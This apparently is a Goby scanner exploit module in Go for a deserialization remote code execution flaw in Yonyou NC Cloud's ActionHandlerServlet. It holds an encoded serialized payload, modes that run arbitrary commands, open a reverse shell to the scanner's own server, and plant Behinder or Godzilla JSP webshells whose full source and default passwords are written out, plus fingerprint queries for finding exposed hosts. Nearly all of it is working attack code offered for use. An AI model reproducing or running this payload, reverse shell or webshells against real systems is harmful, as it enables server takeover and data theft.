package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC ActionHandlerServlet Api Remote Code Execute Vulnerability",
    "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2023-08-20",
    "PostTime": "2023-08-20",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC ActionHandlerServlet 接口远程代码执行漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 是一种商业级的企业资源规划云平台，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，实现企业的数字化转型和业务流程优化。</p><p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>用友 NC Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou NC ActionHandlerServlet Api Remote Code Execute Vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yonyou NC Cloud is a commercial level enterprise resource planning cloud platform that provides comprehensive management solutions for enterprises, including financial management, procurement management, sales management, human resource management, and other functions, achieving digital transformation and business process optimization for enterprises.</p><p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.yonyougz.com/yonyou/yonyou-nc/\" target=\"_blank\">http://www.yonyougz.com/yonyou/yonyou-nc/</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou NC Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10874"
}`

	sendPayloadDWUIQWQEXCJIOIEOH := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/servlet/~ic/com.ufida.zior.console.ActionHandlerServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		payload, _ := hex.DecodeString("1f8b0800000000000000955a097c54e5b5ff9fc964eecde402c9b00e220644cc1e961061a24016966012902010a2d5cbe4261998cc0c77ee64c17dabd6560577f4b9b4af9a875be336a054c4a5dad7c5f7b47dd5aaaf8baff6d956adb6ef3dedf3b5bc73ee9d492661509b5ff8d6b37de79cef9cf3e5f2d007c88d9b28dca1f7e995092b14ae5cabc77bda0cebe9c6ab6eb9f5e081ea1c6020d6af0170ad5809f92186af8e9add957a4c0ff61895c1686f6f3412e73e1c36825648c63b8dc13e3d9c302a37858cce163db62a629983d73efcda9dcb9e3be92d175ccdc861100bbe66615c15d623dd55ebb7ef60f45adeead5631626395b22531553a81de0b59cae6894b9977e0177c6af6cd6770f325ae4dd9b2fbf7bb0e0e61c5033942e3d68454de65bdecc24aa1c12552912551924aa36997a24de15357b0d933933cfc017f0ec4a448476bcb2a1470f458cce0c020b5ebeedfde2ddb7b95da00e4c0865ecc42d5474fc7da224cc14cae7099389f2cce6d28fdfa89eb1cf258664f3297c98da2f7d189e597ac4ca20b8b56f4f619debd19b5da2d1bc501a62172e46ce40ac2f659ddee8ee5038ac578a0de3413314b32a1b8dae502414e96e08ebf1787354ef344c8cfefc7d4a6e8af445771a66865857bf7774e70517beb2d4859c0ee486eacc6e56eee48e6cfe951f6a31ac9e6867abde6b8c75c136cb64016b3b1864836eeabd9b06630693f16592b1c5770c91225f29eb9529f27b5ed97a4f41bc249c5637319c2f13cec17f70daeb8ffcf0c7db46ac020bd3ba0dabd1088675d3e8b4b56a26e4b009d1ec4ca1d4678fe2d24eb65767d8f4d32326911f31fa9b6c7b048d717833c6e1b92cb8eaaa59385747fd437f9efea947ddf4ab9430271cfac1df9e3ecc300be90e2f66e3612f1af08834df91e9b08a47bd9885c7bc781c4f48f3a482a46c1f50719f17737050c5532a9e567048c577553ca3e0b0203cabe2888ae7143c9f8f6978211f2fe27bd2bca4e26515df57f0cf02f503053ff4e247f8b18a5714fc8b8a7ff5e206bc2a745f53f1933cfc14ffe6e5e6672a5e979d3704e9e72ade54f0960cdf56f1ef0a7ea1e2972a7e250bbf56f08e48f71f5efc066fa8785748fd56c57f4aff9e8adf49ff7b21f50715efcbe403151fe6f1fc8fc2e723197dace04f42e3cfd2fc978afb55fcb78aff11a44f547c2afd5f14fcaf17cdf84cc1ff79d18abfcae2df6474941b8234e44515b9188a72980fb955caf592871499a82ae5a9e455295f21cd8b7345ede7d20495264aef5269924a052a15aae4f3d2649a22cd5485a679693acdf0a287fc2acd94fe046ef03d19cd92bd13a599add2492a1509ce1c85e67a61d1c9d2cc90cd7932b29b53bc349f4e95a6d84b25542a0d72533774119f9dca04a15c6049a50a394ea54a552a2d6055d1423e322d5269b14ad52a2d51a946c57e954e53682941abaf6b5b55537d5ec3daba8d6d94edda1126a4a3c966491e2a2d23b84231823b16352dc2e40c9ca6886574737823784ee7b0622d27e414976c66d88668a7419c3e380ab7267ab77394d0b78779c5bb6a2068c4ec4042c80b7300b2af22e194e263652939e6c6334e5ba83ba25b099389157f199cd34b97335a6ecc8c0e0c12e67f01ca881672fbcd90c53c966641f89224bcc1b0a19b760c638d18034690a098461fa71c267c6a16c24d59e9e49889086bb8d308da4a9d96ed081df5ccaf2d9a3083c6ea90285aa9abb6e3be86db70bb4601aad5e8743a43a3e5b48277ad1ed3d03be31aada43a85ea356aa0468d56d16a1a1baf37d9708cbb86d66ad444ebf8243d96c5eee0b1749383253bd128f4c64424e2d8d963f584e2f31630a71e3dd219364cc2ec51b8d6685b22d8b33a64843b47fc41a33345324f7738ba5d0ff369d86241231ee74c4398385a863487e29646cdd4a250ab46eb69834667d146d192b18b90cf226d34e231f62ff1bf71bea0511b6d22148ccf470a9dadd166dac2eec5f86b0d498b63c01c353393606fa7867bf14d8db6523b83c70dabcd62778c2bb44da30e3a47a373e92b84791949d48af60675cb29ecb627ba2aeb072da3a12711d9a9e11f709746e789f82a53920d3e2c27038dce174195cee816c70d278fca32a2b1d46a652414b569d627baba446e77bfa9c734d27117a1689c065aa3d6ea682292a9f6ed1454a893008d0ceae2634bd267a31545a2565124110e6bd44d6bf9469c2c3f1af55048c3b7f14d020534da413b0973d32829ef2eea89c6ad22a90974abc830cda83947c3cdd8ab51987a35dc825bc768d77132f6546271a2b89d79cd931ff6ad2e76e6f184be857f648895f2a3e13e1144b36985a255e2fb4287fd7346e6dafa84154bb0a5984fafecefd2b01f0f302932358acb05b1a4498893f749d34f03acfe68bc32c2f58942831aed16a35f208ac8e90f45241cda1ee1aae0f1f4f19e529f0885d98734ba902e62598b2a2245d50c5b15b427963d89f70836ebfe628d2ea14bf9287419398f00c7d3db827a2462980a5daed11574a5c87d15a39ca36bf455ba5adc9e05bd8637e86ba233a56a7b2852255415f6d24a8e3742f2daf42d881856555b34b8d3b084d0d735fa065da7d1f5b441a11b34da436c9c1b69af423789566ed6e816ba55a3db682fe1c4b4552584252cc3314479516fbcbba862b946b78b52680ebbe378c0e8ce391aed63d2b81f431cb9e28948656f281eac74d250a31dd1d8633527b6a51db860f42154afc78d1ad696d7a9cb1cf0f9592b54a651c91ad0cdc1112c2eae082bebea1b1a57ad5eb3b669dd99cd2dadeb379cb5b16dd3d99bb76c6ddfa66f0f761a5ddd3da11d3bc3bd91686c173f06127dfd0383bb172c5cb4b87a49cd694b979555714a0c264cd3e00adc7654c294e292636324472916d299ac31a309f6417f16387b8b8155064ee5bec9c5d9325d4146296a874a42c517642fd3e89232bdca06af1de39763b6f8441c6eea82125f4376bc76176f93bc9d6347f43149325552971cbbc48ec6e052c08fd7c848ea5283d188c54f313ee4099944f97d66b619bb1206d7c8b525db581ea6d496881966d05189ca51cfd4b9f2967c5792f10a6d4aadd7a613cf98553bdfc45b8d01cbae4498b03b624fc6ca37720009f7ce3b84fd248b728f7d736453b743a1361d73b2ec715e0bd9af25c2b22ccacdf242ca2aaef84c2a49b88bed9c5f784c31c65b9bda37ace2ad2c3ea5d87f1058df255a1d536c8c567299cf172692e184e9a3281c8f1dab4f151f660bb38a331e94e3fd3e638be94fcdbac10a6277d0c37cb2a9d9bc4f2cc926e142cacba299567c4bc8ea19079bbe100c9b1b8f854356f622aba423aba7c6748e5cac86e3106de2db94b99e2e756ae5dae4da321d0793f70b53eba96ce4e01477d4db7d573821413b37188e4acda25ad174b53189d55bb73d1e0d732cdda0cb79b97c8c8575314ce371afd371af59b66367d6388371cbe8754aa80d6694efa2c50573be156d8ef61b66832ec279f458cc887c894834260dd68ef153d69c1512ef91983e32993ac66552cbb552e367315726e806a74c1ccb23b5e884e4a6c848ee1723968cd82263432e6f71d60db19196881b8d4638d42b51e9385e9511a352893b95115649b64cb3573a8db86546073f97c8b873652bf89b442cf18fccca46ce307abacc1d71f050bc413cac335d4c8e3d27c7425e0c859df29d63273bbc3b95edb2519408d4e4f87ed830e47958bc4ea679c640c879393a066ee133e8dde2d7a1d48b92dff6376036587ce46026f6602f8f6f94bf86e026fec765a23de62291fb3cdee3070ccff701394978309937af2f3d003a08571239cd6549b87db9bcd352ee4e4229e7b97a0479fcdb5a1170fbdd876b72736a3c533d5373bfe5daea774ff52c0a287ee56578865c0d7e25096f40f5abbefc24b43b30814713ec11ef9e22bb6edfc451d2b2a006f2fc79cf61920de2f2e709484106485e0a44d60b657d08d3025e7b9ec464fe75568f8596ad290e42410ac19967213c75dcfa114c3b62b3f13e85e98440be3fff29cc20eca30e19f97949f36b8239330353138a13fc1364fd849c67302b8913fd1378303b899302139d8d22376fb4e7f8e6b4d9bb3c9bcdb3b93c3be908e60426f927892a8fee2df54f4ae2e424e6050afc1305f11407f131ccb731273a9885f8fe419c2ad85b4a7dc54994040afdac90523e59a1afcce3f02a6f6b770b5e7bae835de1cff3d8d8fe02dec91102edb9fe82c3694a0ec34a87a1bf30939f3fcf8618c2fa4061a96f8130f4f97dbe85ee3427a1ee73a7a9cbc1f3c692f36525377108b901f54a0f0dfd75e85128fc247c108fc08757f0367e091fbde85ae05a8c2aac40a3eb2aeed760bbdd1bb8caeeaf715d62f7843bd8cb7f81d3b89d0e3766201f7e4ce57b311327603e4e640a273176115af9de18988b184e4602f370114ec1350c71134ee5fb51cc1294b20c152c451986518ee750899798c32b58c83255b3548bf06b2cc6fb58828f5183bfe034726329e561194d478016a39696e3746ac019742696532756d0b5584937a08e6e4403dd85467a11abe94758433fc15ad74434b916a0954fb9ceb50467bace40b3eb5cb4b82ec17ad7e568e3d39de5ba1a27baaec3d9b8934fe7e6b3ca79f9c9cbf79e6f3396f1adcee1beb0ec20160db7d8f7b99aafef92610613845c16d751d0441bf03c5e399f43803e427031eeb683c53d3ce65739b742f828efb9b9bfb3ec2568be1a2679da3e787c4b8779b4acb9cc1748a2761f6a4bcb0ee074df19492c6f293f9c7b0f43ac182e2dcf59f424569696bb171d441d3bd893a83f8486760e388dad1549acf2ad1e2ef3adb109cc3d96c05a9b002327d1c470eb6cb809a5366012670e8f8ee46fc2f6d136620ab73b3101611420c2b68f7274dc851298acaf385b2dc19aeac36af4633d06d086416cc66e56c605d8810bd91f2e62a84b70312ec5d5b88ca3e7154c99dfc82965f4b1eae4af873587d0dccedc5b5a0fa1b5bde200df088e8ee507b12189b3fc1c11364ad336847c594f62d3301ff76c31451e7b59c988afcee739703db77b3816efc52c8edd73d80be773bc2ee1e85dc6917b21c76c97fc8d20254315cbe0120f67ddfb6a92d8ec5be7746bec6e54191edbf2f7727b5f1a995e605b324b3ad5b7e520b626d1de629b915acb7ddb3856efc3ca325f873d282af39d6347efe987706efb017c8501cff39dcf4d127a3387903976e86a77fbb67300296b0bb88770c6e72307c722770ab291423e882e5154372bb4a79d95153a801dbe9d498403b97e4e48bdfb902f7d844385af26e049414547a1528cfc1e66722c86c339e0f17b024ac54b501837e657861de29b029e9135cf70401d99a8cfb2baf6e033f2b0d6a59fc9aaf3d024bb9f49b368e688b277d85f26f6b3721fe00bf6207bdfc31c7b247e7c87a3cea3ec658fa3074fb08f2599d2536c8ca719ea109ec577f12a9ec127388ccff03c5fb71728078799e3b3a4e2084dc2f33499d7a6f378268f8bf00273bc1f4329839a2ca17ccb7c276d50db8e7720cfb7ab75882f91d9ca9ae5c3c403ee43b0dacb661d40824fcdaa0eb136b88b7206671df471e6e6593f476c9e0d70fae36ef00e9c2f0add7d370afc5e195d90c48543473f94e49d5a544617d5d4629e8cd28bde242e92bc7ad1145c7c10970a93cb38e6ab81fca1a377cb2c269c2e1f42516bca84be2bd85a2cf295e2335739961bf67d7598bd7e88b53accb600ebedf9915b14e1e80ed662015ec334fc94f5fe338eedaf73fc7e03f5f83936e04d6cc55b1ceede462fe78704c7efcb397e5f8b77f86efd86a3e8bb7c417ecbd4df63fabf630ebfc763f8039ec4076ca50f99d7c7cced8facf98f18f34fccf59f384b38b7b1826fa35cb3c2d2d22738d43d81fa24ae4ee29a2d8f8eb886d7beae9fb0789fb27bec6707714c378b6fa844d687a8d9f7358eda2de5be6b330b84724ee54ea62c752a8472fe6d1e82bba5ec6534f8bece28be6fa44a0d4a551a2de5926eaf1b43e6b834aa7dd73b6cc7c0b7567c0ee3613bf85460012b7f0907568bfb4176c7fd23c6588d4239385ce482caae5cc1aebc8093e34252b08413643379b18b26c0a27c24d8bd07a91097900f37b09bdf4fd3b09fa6e0019ac1241eb4b3d14316f23be543ab61bf70473e02bafaccd4dfb6ec8f904e297fef47df5ebabbf6f17afbbb9ffd95b038ebd745210019cc1afda82883d9c7ff162983b963a1e7d9d093ec16f6ff282848fd8f020c1cfb5f105af458aef2e6732f4c3bff55d6e16a78e583cd6afbfb7d13f2e41b42bc271aee1c88a569f4ab42d1a63630f0fff8413b33d7200000")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	checkFileExistDZXCZXCASDJWQIEH := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(15)
			resp, err := sendPayloadDWUIQWQEXCJIOIEOH(hostInfo, "echo "+checkString)
			return err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			webshell := stepLogs.Params["webshell"].(string)
			if attackType == "cmd" {
				cmd := stepLogs.Params["cmd"].(string)
				resp, err := sendPayloadDWUIQWQEXCJIOIEOH(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 {
					expResult.Success = true
					results := resp.Utf8Html
					startIndex := strings.Index(resp.Utf8Html, "<html>")
					if startIndex != -1 {
						results = resp.Utf8Html[:startIndex]
					}
					expResult.Output = results
					return expResult
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = sendPayloadDWUIQWQEXCJIOIEOH(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = stepLogs.Params["content"].(string)
					filename = stepLogs.Params["filename"].(string)
				}
				_, err := sendPayloadDWUIQWQEXCJIOIEOH(expResult.HostInfo, fmt.Sprintf("$$$$$./webapps/nc_web/"+filename+":"+base64.StdEncoding.EncodeToString([]byte(content))))
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				resp, err := checkFileExistDZXCZXCASDJWQIEH(expResult.HostInfo, filename)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/" + filename + "\n"
					if webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: jsp"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
